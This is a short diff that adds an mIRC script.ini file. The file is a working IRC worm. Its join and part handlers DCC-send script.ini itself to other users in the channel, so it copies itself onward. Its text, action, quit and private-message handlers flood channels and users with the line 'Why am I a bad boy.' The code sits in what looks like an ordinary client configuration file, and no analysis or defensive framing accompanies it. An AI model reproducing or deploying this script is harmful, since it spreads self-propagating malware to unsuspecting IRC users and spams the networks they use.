@@ -1,0 +1,11 @@
+[script]
+n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
+n1=  /dcc send $nick $mircdirscript.ini
+n2=}
+n3=ON 1:TEXT:*:#:/msg $chan Why am I a bad boy.
+n4=ON 1:ACTION:*:#:/msg $chan Why am I a bad boy.
+n5=ON 1:QUIT:#:/msg $chan Why am I a bad boy.
+n6=ON 1:PART:#:{ /if ( $nick == $me) { halt }
+n7=  /dcc send $nick $mircdirscript.ini
+n8=}
+n9=ON 1:TEXT:*:?:/msg $nick Why am I a bad boy.
